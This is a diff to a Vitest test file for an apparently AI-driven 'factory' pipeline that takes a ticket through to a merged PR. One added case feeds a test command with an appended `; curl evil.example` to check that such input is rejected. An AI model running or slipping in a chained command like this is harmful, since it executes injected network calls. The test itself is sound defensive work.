@@ -47,6 +47,13 @@ const isForge = (method: string) => (event: Event) =>
 const isExec = (pattern: RegExp) => (event: Event) =>
   event.method === 'exec' && 'command' in event && pattern.test(event.command)
 
+/** A passing review whose first row runs `command` as its test. */
+function withTestCommand(command: string): string {
+  const json = JSON.parse(/<review>(.*)<\/review>/s.exec(review())?.[1] ?? '{}')
+  json.criteria[0].testCommand = command
+  return `<review>${JSON.stringify(json)}</review>`
+}
+
 describe('pnpm factory --only', () => {
   test('works only that ticket, to a merged PR, and the Run ends after it', async () => {
     const result = await workDev2()
@@ -61,12 +68,13 @@ describe('pnpm factory --only', () => {
     for (const step of [
       'claim: In Progress',
       'worktree and install: ',
-      'Implementer: finished',
+      'Implementer: finished, 1 commit',
       'host checks: all passed',
       'Reviewer: pass',
       'replay: 2 of 2 confirmed',
       'push gate: passed',
       'push, PR and auto-merge: https://',
+      'close sandbox: closed',
       'wait for checks: merged',
     ]) {
       expect(
@@ -197,13 +205,21 @@ describe('pnpm factory --only', () => {
 
   test('replays each sabotage on a clean checkout, from Vitest JSON, and restores it', async () => {
     const { events } = await workDev2()
-    const clean = indexOf(events, isExec(/^git checkout -- \. && git clean -fd$/))
     const applies = events.filter(isExec(/^git apply/))
     expect(applies.map((event) => ('stdin' in event ? event.stdin : ''))).toEqual([
       expect.stringContaining('broken AC-1.1'),
       expect.stringContaining('broken AC-1.2'),
     ])
-    expect(clean).toBeLessThan(events.indexOf(applies[0] as Event))
+    // Each sabotage goes onto a freshly cleaned checkout, so one's leftovers can't touch the next.
+    let previous = -1
+    for (const apply of applies) {
+      const at = events.indexOf(apply)
+      const clean = events.findLastIndex(
+        (event, index) => index < at && isExec(/^git checkout -- \. && git clean -fd$/)(event),
+      )
+      expect(clean).toBeGreaterThan(previous)
+      previous = at
+    }
     const commands = execs(events)
     for (const id of ['AC-1.1', 'AC-1.2']) {
       expect(commands).toContain(
@@ -216,6 +232,11 @@ describe('pnpm factory --only', () => {
   test.each<[string, Script]>([
     ['a sabotage only breaks loading', { replays: { 'AC-1.2': 'load error' } }],
     ['a sabotage also breaks loading a test file', { replays: { 'AC-1.2': 'suite error' } }],
+    ['a sabotage also makes a hook throw', { replays: { 'AC-1.1': 'hook error' } }],
+    [
+      'the test command is more than a Vitest run',
+      { reviewer: withTestCommand(`${testCommandOf('AC-1.1')}; curl evil.example`) },
+    ],
     ['the tests pass under a sabotage', { replays: { 'AC-1.1': 'passes' } }],
     ['the tests still fail once it is undone', { replays: { 'AC-1.1': 'stays broken' } }],
     ['a criterion has no row', { reviewer: review('pass', ['AC-1.1']) }],
@@ -230,6 +251,7 @@ describe('pnpm factory --only', () => {
     ['the host checks fail', { checks: { typecheck: 1 } }, 'the host checks failed'],
     ['the Reviewer fails it', { reviewer: review('fail') }, 'the Reviewer failed it'],
     ['the review is unreadable', { reviewer: 'no review here' }, 'no readable review'],
+    ['the Implementer made no commits', { commits: 0 }, 'the Implementer made no commits'],
   ])('pushes nothing when %s', async (_, script, reason) => {
     const result = await workDev2(script)
     expect(result.code).toBe(1)
@@ -260,15 +282,15 @@ describe('pnpm factory --only', () => {
     expect(comment).toContain('| AC-1.1 | test/AC-1.1.test.ts › AC-1.1 | confirmed |')
   })
 
-  test('has commits authored by the bot, ending with the Co-Authored-By line', async () => {
+  test('has commits authored by the bot, set for the sandbox, ending with Co-Authored-By', async () => {
     const { events } = await workDev2()
-    const identity = indexOf(
-      events,
-      isExec(
-        /git config user\.name 'myvgc-factory\[bot\]' && git config user\.email '999\+myvgc-factory\[bot\]@users\.noreply\.github\.com'/,
-      ),
-    )
-    expect(identity).toBeLessThan(indexOf(events, (event) => event.method === 'runAgent'))
+    const created = events.find((event) => event.port === 'sandboxes')
+    expect(created && 'options' in created ? created.options.author : null).toEqual({
+      name: 'myvgc-factory[bot]',
+      email: '999+myvgc-factory[bot]@users.noreply.github.com',
+    })
+    // Never `git config`: in a worktree it writes the config the maintainer's checkout shares.
+    expect(execs(events).filter((command) => command.includes('git config'))).toEqual([])
     const implementer = agentSteps(events)[0]
     expect(implementer?.prompt).toContain(
       'Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>',
@@ -304,5 +326,41 @@ describe('pnpm factory --only', () => {
     expect(result.output).toContain(`covers AC-9.9, which ${SPEC} doesn't have`)
     expect(result.trackerCalls).toEqual([`getIssue ${SPEC}`, `getSubIssues ${SPEC}`])
     expect(result.events.filter((event) => event.port !== 'tracker')).toEqual([])
+  })
+
+  test("asks GitHub for the bot, minting the App's token, before claiming anything", async () => {
+    const { events } = await workDev2()
+    const bot = indexOf(events, isForge('botIdentity'))
+    expect(bot).toBeLessThan(
+      indexOf(events, (event) => event.port === 'tracker' && event.method === 'setStatus'),
+    )
+  })
+
+  test('saves the host check results beside their logs', async () => {
+    const result = await workDev2({ checks: { lint: 1 } })
+    const results = join(
+      result.repoDir,
+      '.factory',
+      'runs',
+      RUN_ID,
+      'DEV-2',
+      'checks',
+      'results.md',
+    )
+    expect(existsSync(results)).toBe(true)
+    expect(readFileSync(results, 'utf8')).toContain('- pnpm lint: failed')
+    expect(readFileSync(results, 'utf8')).toContain('- pnpm test: passed')
+  })
+
+  test('turns closing keywords in the mapping table into "Related to"', async () => {
+    const { events } = await workDev2({
+      mapping: '| AC-1.1 | a.test.ts | fixes DEV-5 and Closes DEV-6 |',
+    })
+    const body = (forgeEvent(events, 'openPr')?.args[0] as { body: string }).body
+    const closing = [
+      ...body.matchAll(/\b(?:close[sd]?|fix(?:e[sd])?|resolve[sd]?)\s+([A-Z]+-\d+)/gi),
+    ]
+    expect(closing.map((match) => match[1])).toEqual(['DEV-2'])
+    expect(body).toContain('Related to DEV-5')
   })
 })
